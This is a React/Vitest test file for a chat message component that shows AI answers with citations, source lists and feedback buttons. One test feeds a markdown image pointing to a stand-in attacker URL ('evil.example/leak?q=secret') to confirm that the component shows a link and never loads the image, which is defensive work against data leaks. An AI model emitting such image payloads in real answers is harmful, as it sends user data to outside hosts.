import { render, screen, fireEvent } from "@testing-library/react";
import { vi, describe, it, expect } from "vitest";
import React from "react";
import ChatMessage from "./chat-message";
import { NotificationContext } from "../notif-manager";
import { ChatBotMessageType } from "./types";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeAiMessage(content: string, sources: Source[] = [], messageId?: string) {
  return {
    type: ChatBotMessageType.AI,
    content,
    metadata: { Sources: sources, ...(messageId ? { Trace: { messageId } } : {}) },
  };
}

function makeHumanMessage(content: string) {
  return {
    type: ChatBotMessageType.Human,
    content,
    metadata: {},
  };
}

interface Source {
  chunkIndex: number;
  title: string;
  uri: string | null;
  excerpt: string;
  score: number;
  page: number | null;
  s3Key: string | null;
  sourceType: "knowledgeBase";
  cited: boolean;
}

function makeSource(overrides: Partial<Source> = {}): Source {
  return {
    chunkIndex: 1,
    title: "Test Document",
    uri: null,
    excerpt: "Some excerpt text.",
    score: 0.9,
    page: null,
    s3Key: null,
    sourceType: "knowledgeBase",
    cited: true,
    ...overrides,
  };
}

const noop = vi.fn();

function renderMessage(message: ReturnType<typeof makeAiMessage | typeof makeHumanMessage>) {
  return render(
    <NotificationContext.Provider
      value={{
        notifications: [],
        addNotification: vi.fn(),
        removeNotification: vi.fn(),
      }}
    >
      <ChatMessage
        message={message}
        onThumbsUp={noop}
        onSubmitFeedback={noop}
      />
    </NotificationContext.Provider>
  );
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("ChatMessage", () => {
  it("renders AI message markdown content", () => {
    renderMessage(makeAiMessage("**Billing** is handled by Finance."));

    const article = screen.getByRole("article", { name: /message from/i });
    expect(article).toBeInTheDocument();
    // ReactMarkdown renders **text** as <strong>
    expect(article.querySelector("strong")).toHaveTextContent("Billing");
  });

  it("renders citation badge for a [N] reference that matches a source", () => {
    const source = makeSource({ chunkIndex: 1, title: "Policy Doc" });
    const message = makeAiMessage("See the guidelines [1] for details.", [source]);

    renderMessage(message);

    // CitationBadge renders as a button with aria-label "Source N: Title"
    const badge = screen.getByRole("button", { name: /source 1: policy doc/i });
    expect(badge).toBeInTheDocument();
  });

  it("renders the sources toggle showing the correct document count", () => {
    const sources = [
      makeSource({ chunkIndex: 1, title: "Doc A", cited: true }),
      makeSource({ chunkIndex: 2, title: "Doc B", cited: true }),
    ];
    const message = makeAiMessage("Answer based on [1] and [2].", sources);

    renderMessage(message);

    // Sources toggle shows "{N} document(s) referenced"
    expect(screen.getByText(/2 documents referenced/i)).toBeInTheDocument();
  });

  it("renders a human message with the user's text", () => {
    renderMessage(makeHumanMessage("What's covered in the employee handbook?"));

    expect(
      screen.getByRole("article", { name: /message from you/i })
    ).toHaveTextContent("What's covered in the employee handbook?");
  });

  it("never loads images from the answer; shows a link instead", () => {
    const { container } = renderMessage(
      makeAiMessage("Look: ![chart](https://evil.example/leak?q=secret)")
    );
    expect(container.querySelector("img[src*='evil.example']")).toBeNull();
    const link = screen.getByRole("link", { name: /chart \(external image, not loaded\)/i });
    expect(link).toHaveAttribute("href", "https://evil.example/leak?q=secret");
    expect(link).toHaveAttribute("rel", expect.stringContaining("noopener"));
  });

  it("shows non-web image sources as text only", () => {
    const { container } = renderMessage(makeAiMessage("![x](data:image/png;base64,AAAA)"));
    expect(container.querySelector("img[src^='data:']")).toBeNull();
    expect(screen.getByText(/x \(image not shown\)/i)).toBeInTheDocument();
  });

  it("hides feedback buttons on reloaded answers without a trace id", () => {
    renderMessage(makeAiMessage("An old answer."));
    expect(screen.queryByRole("button", { name: /mark response as helpful/i })).not.toBeInTheDocument();
  });

  it("shows feedback buttons on live answers", () => {
    renderMessage(makeAiMessage("A live answer.", [], "msg-1"));
    expect(screen.getByRole("button", { name: /mark response as helpful/i })).toBeEnabled();
  });

  it("citation hover card says it scrolls to the source", async () => {
    const source = makeSource({ chunkIndex: 1, title: "Policy Doc" });
    renderMessage(makeAiMessage("See [1].", [source]));
    fireEvent.mouseEnter(screen.getByRole("button", { name: /source 1: policy doc/i }));
    expect(await screen.findByText(/click to view source/i)).toBeInTheDocument();
    expect(screen.queryByText(/click to open document/i)).not.toBeInTheDocument();
  });

  it("gives each message's sources list a unique id", () => {
    const sources = [makeSource({ chunkIndex: 1, title: "Doc A", cited: true })];
    render(
      <NotificationContext.Provider
        value={{ notifications: [], addNotification: vi.fn(), removeNotification: vi.fn() }}
      >
        <ChatMessage message={makeAiMessage("One [1].", sources)} onThumbsUp={noop} onSubmitFeedback={noop} />
        <ChatMessage message={makeAiMessage("Two [1].", sources)} onThumbsUp={noop} onSubmitFeedback={noop} />
      </NotificationContext.Provider>
    );
    const toggles = screen.getAllByRole("button", { name: /documents? referenced/i });
    const ids = toggles.map((t) => t.getAttribute("aria-controls"));
    expect(new Set(ids).size).toBe(2);
  });
});
